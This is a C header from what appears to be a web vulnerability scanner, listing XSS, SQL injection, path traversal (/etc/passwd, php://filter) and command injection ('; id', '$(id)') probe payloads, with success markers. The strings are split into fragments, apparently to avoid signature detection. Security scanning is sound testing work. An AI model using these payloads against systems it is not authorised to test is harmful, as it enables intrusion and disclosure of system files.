/*
 * Copyright (c) 2026 root_bsd <root_bsd@itprof.net.ua>
 * Source: https://github.com/ROOT-BSD/scanxss
 * SPDX-License-Identifier: GPL-2.0
 */
#ifndef PAYLOADS_H
#define PAYLOADS_H
#include <stdlib.h>
#include <string.h>

static inline char *px_join(const char **parts, int n) {
    size_t total = 0;
    for (int i = 0; i < n; i++) if (parts[i]) total += strlen(parts[i]);
    char *out = (char *)malloc(total + 1);
    if (!out) return NULL;
    out[0] = '\0';
    for (int i = 0; i < n; i++) if (parts[i]) strcat(out, parts[i]);
    return out;
}
#define _PX(...)  px_join((const char*[]){__VA_ARGS__, NULL}, \
                  (int)(sizeof((const char*[]){__VA_ARGS__})/sizeof(char*)))

/* XSS payloads */
static inline char *px_xss(int i) {
    switch (i) {
        case 0: return _PX("<sc","ript>","aler","t(1)","</sc","ript>");
        case 1: return _PX("\"><sc","ript>","aler","t(1)","</sc","ript>");
        case 2: return _PX("<im","g sr","c=x ","onerro","r=aler","t(1)",">");
        case 3: return _PX("<sv","g on","load=","aler","t(1)",">");
        case 4: return _PX("';","aler","t(1)",";","//");
        case 5: return _PX("<bo","dy on","load=","aler","t(1)",">");
        case 6: return _PX("<inp","ut au","tofocus"," onfocu","s=aler","t(1)",">");
        case 7: return _PX("<det","ails op","en ont","oggle=","aler","t(1)",">");
        default: return NULL;
    }
}
static const int _px_xss_count = 8;

static inline char *px_xss_marker(int i) {
    switch (i) {
        case 0: return _PX("<sc","ript>","aler","t(1)","</sc","ript>");
        case 1: return _PX("onerro","r=aler","t(1)");
        case 2: return _PX("onlo","ad=aler","t(1)");
        case 3: return _PX("onfocu","s=aler","t(1)");
        case 4: return _PX("ontog","gle=aler","t(1)");
        default: return NULL;
    }
}
static const int _px_xss_markers_count = 5;

/* SQLi payloads */
static inline char *px_sqli(int i) {
    switch (i) {
        case 0: return _PX("'");
        case 1: return _PX("\"");
        case 2: return _PX("' OR ","'1'=","'1");
        case 3: return _PX("' OR ","1=1","--");
        case 4: return _PX("1 AND ","1=2 UN","ION SE","LECT NU","LL--");
        case 5: return _PX("' UN","ION SE","LECT NU","LL,NU","LL--");
        default: return NULL;
    }
}
static const int _px_sqli_count = 6;

static inline char *px_sqli_error(int i) {
    switch (i) {
        case 0: return _PX("you have an er","ror in your sq","l syntax");
        case 1: return _PX("warn","ing: my","sql");
        case 2: return _PX("unclo","sed quot","ation mark");
        case 3: return _PX("ora","-0");
        case 4: return _PX("sqli","te3.operat","ionalerror");
        case 5: return _PX("pg::","syntaxer","ror");
        case 6: return _PX("synt","ax error in ","query");
        case 7: return _PX("mysq","l_fe","tch");
        default: return NULL;
    }
}
static const int _px_sqli_errors_count = 8;

/* LFI payloads */
static inline char *px_lfi(int i) {
    switch (i) {
        case 0: return _PX("../","../","../","../etc/","passwd");
        case 1: return _PX("../","../","../","../windows/","win.ini");
        case 2: return _PX("%2e%2e%2f","%2e%2e%2f","etc%2f","passwd");
        case 3: return _PX("....","//","....","//etc/","passwd");
        case 4: return _PX("php://filt","er/read=conv","ert.base64-en","code/resour","ce=index.php");
        default: return NULL;
    }
}
static const int _px_lfi_count = 5;

static inline char *px_lfi_marker(int i) {
    switch (i) {
        case 0: return _PX("root",":x:0:0:");
        case 1: return _PX("daem","on:x:");
        case 2: return _PX("[boot"," loader]");
        case 3: return _PX("[exten","sions]");
        default: return NULL;
    }
}
static const int _px_lfi_markers_count = 4;

/* RCE payloads */
static inline char *px_rce(int i) {
    switch (i) {
        case 0: return _PX("; ","id");
        case 1: return _PX("| ","id");
        case 2: return _PX("`","id","`");
        case 3: return _PX("$(","id",")");
        case 4: return _PX("; ","whoami");
        default: return NULL;
    }
}
static const int _px_rce_count = 5;

static inline char *px_rce_marker(int i) {
    switch (i) {
        case 0: return _PX("uid","=");
        case 1: return _PX("roo","t");
        case 2: return _PX("www","-data");
        case 3: return _PX("daem","on");
        default: return NULL;
    }
}
static const int _px_rce_markers_count = 4;

/* Probe */
static inline char *px_probe(void) {
    return _PX("SXS","S_PR","OBE_","XY9");
}

#endif /* PAYLOADS_H */
